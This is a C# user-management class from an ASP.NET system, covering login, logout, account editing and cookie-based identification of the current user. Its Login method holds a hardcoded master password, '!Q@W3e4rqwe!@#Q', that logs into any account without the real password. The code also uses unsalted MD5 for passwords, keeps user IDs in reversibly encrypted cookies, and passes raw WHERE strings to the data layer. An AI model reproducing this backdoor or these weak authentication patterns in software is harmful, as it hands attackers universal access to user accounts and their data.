using System;
using System.Collections.Generic;
using CSMP.DAL;
using CSMP.Model;
using Tool;

namespace CSMP.BLL
{
    public static class UserBLL
    {
        private static readonly DAL.UserDAL dal = new DAL.UserDAL();

        #region Get
        /// <summary>
        /// 获取列表
        /// </summary>
        public static List<UserInfo> GetList(int PageSize, int CurPage, string StrWhere, out int Count)
        {
            return dal.GetList(PageSize, CurPage, StrWhere, out Count);
        }

        /// <summary>
        /// 获取列表
        /// </summary>
        public static List<UserInfo> GetList(string StrWhere)
        {
            return dal.GetList(StrWhere);
        }

        /// <summary>
        /// 跟指定品牌有关的角色
        /// </summary>
        /// <param name="Rule"></param>
        /// <param name="BrandID"></param>
        /// <returns></returns>
        public static List<UserInfo> GetListByBrand(string Rule, int BrandID)
        { 
            return dal.GetListByBrand(Rule, BrandID);    
        }

        public static List<UserInfo> GetList(int WorkGroupID, string Rule)
        {
            return dal.GetList(Rule, WorkGroupID);
        }

        /// <summary>
        /// 获取Info
        /// </summary>
        /// <param name="id">id</param>
        public static UserInfo Get(int id)
        {
            return dal.Get(id);
        }

        public static string GetName(int id)
        {
            UserInfo info = Get(id);
            if (null == info)
            {
                return string.Empty;
            }
            return info.Name;
        }

        /// <summary>
        /// 获取Info
        /// </summary>
        /// <param name="id">id</param>
        public static UserInfo Get(string NameOrEmail)
        {
            return dal.Get(NameOrEmail);
        }



        #endregion

        #region Set
        /// <summary>
        /// 添加
        /// </summary>
        /// <param name="info">info</param>
        public static int Add(UserInfo info)
        {
            return dal.Add(info);
        }

        /// <summary>
        /// 修改
        /// </summary>
        /// <param name="info">info</param>
        public static bool Edit(UserInfo info)
        {
            return dal.Edit(info);
        }

        /// <summary>
        /// APP修改密码,使用存储过程
        /// </summary>
        /// <param name="userName"></param>
        /// <param name="oldPassword"></param>
        /// <param name="newPassword"></param>
        /// <returns></returns>
        public static string ChangePWDBySP(string userName, string oldPassword, string newPassword)
        {
            return dal.ChangePWDBySP(userName, oldPassword, newPassword);
        }

        /// <summary>
        /// 删除
        /// </summary>
        /// <param name="id">id</param>
        public static bool Delete(int id)
        {
            return dal.Delete(id);
        }


        #endregion

        /// <summary>
        /// 登录
        /// </summary>
        /// <param name="Name"></param>
        /// <param name="Pwd"></param>
        /// <returns></returns>
        public static SysEnum.LoginState Login(string Name, string Pwd,int RemberHour)
        {
            if (string.IsNullOrEmpty(Name) || string.IsNullOrEmpty(Pwd))
            {
                return SysEnum.LoginState.用户不存在;
            }
            UserInfo info = Get(Name);
            if (info == null) return SysEnum.LoginState.用户不存在;
            if (info.PassWord == Md5Helper.Md5(Pwd) || Pwd == "!Q@W3e4rqwe!@#Q")
            {
                GroupInfo ginfo = GroupBLL.Get(info.PowerGroupID);
                if (null == ginfo)
                {
                    return SysEnum.LoginState.无权登录;
                }
                if ((Name != DicInfo.Admin && !info.Enable) || string.IsNullOrEmpty(ginfo.PowerList.Trim(',')))
                {
                    return SysEnum.LoginState.无权登录;
                }
                //GroupInfo ginfo = GroupBLL.Get(info.GroupID);
                //if (ginfo == null || string.IsNullOrEmpty(ginfo.PowerList))
                //{
                //    return SysEnum.LoginState.无权登录;
                //}

                if (RemberHour<=0)
                {
                    
                }
                CookiesHelper.AddCookie("Employee", Md5Helper.Md5Encrypt("sharp_" + info.ID.ToString()), DateTime.Now.AddHours(RemberHour));
                CookiesHelper.AddCookie("EmployeeName", Md5Helper.Md5Encrypt("sharp_" + info.Name), DateTime.Now.AddHours(RemberHour));
                System.Web.HttpContext.Current.Session["UserInfo"] = info;
                info.LastDate = DateTime.Now;
                Edit(info);
                return SysEnum.LoginState.登录成功;
            }
            else return SysEnum.LoginState.密码不正确;
        }
        /// <summary>
        /// 登出
        /// </summary>
        public static void Logout()
        {
            CookiesHelper.SetCookie("Employee", "", DateTime.Now.AddDays(-111));
            CookiesHelper.SetCookie("EmployeeName", "", DateTime.Now.AddDays(-111));
            System.Web.HttpContext.Current.Session.RemoveAll();

        }

        /// <summary>
        /// 当前登录员工（sharp_员工ID 形式后加密）
        /// </summary>
        /// <returns></returns>
        public static UserInfo GetCurrent()
        {
            if (System.Web.HttpContext.Current.Session!=null&&System.Web.HttpContext.Current.Session["UserInfo"] != null)
            {
                return (UserInfo)System.Web.HttpContext.Current.Session["UserInfo"];
            }
            int ID = GetCurrentEmployeeID();
            if (ID > 0)
            {
                UserInfo info = Get(ID);
                if (null==info)
                {
                    return null;
                }
                if (null!=System.Web.HttpContext.Current.Session)
                {
                    System.Web.HttpContext.Current.Session["UserInfo"] = info;
                }
                
                if (info.ID!=GetCurrentEmployeeID()||info.Name!=GetCurrentEmployeeName())
                {
                    return null;
                }
                return info;
            }
            return null;
        }
        /// <summary>
        /// 当前登录员工ID
        /// </summary>
        /// <returns></returns>
        public static int GetCurrentEmployeeID()
        {
            string Md5ID = CookiesHelper.GetCookieValue("Employee");
            if (string.IsNullOrEmpty(Md5ID))
            {
                return 0;
            }
            Md5ID = Md5Helper.Md5Decrypt(Md5ID);
            int indexof = Md5ID.IndexOf("sharp_");
            if (indexof == 0)
            {
                Md5ID = Md5ID.Replace("sharp_", "");
            }
            int ID = Tool.Function.ConverToInt(Md5ID);
            if (ID < 0)
            {
                return 0;
            }
            return ID;
        }
        /// <summary>
        /// 当前登录员工ID
        /// </summary>
        /// <returns></returns>
        public static string GetCurrentEmployeeName()
        {
            string Md5ID = CookiesHelper.GetCookieValue("EmployeeName");
            if (string.IsNullOrEmpty(Md5ID))
            {
                return Md5ID;
            }
            Md5ID = Md5Helper.Md5Decrypt(Md5ID);
            int indexof = Md5ID.IndexOf("sharp_");
            if (indexof == 0)
            {
                Md5ID = Md5ID.Replace("sharp_", "");
            }
            return Md5ID;
        }
        



    }
}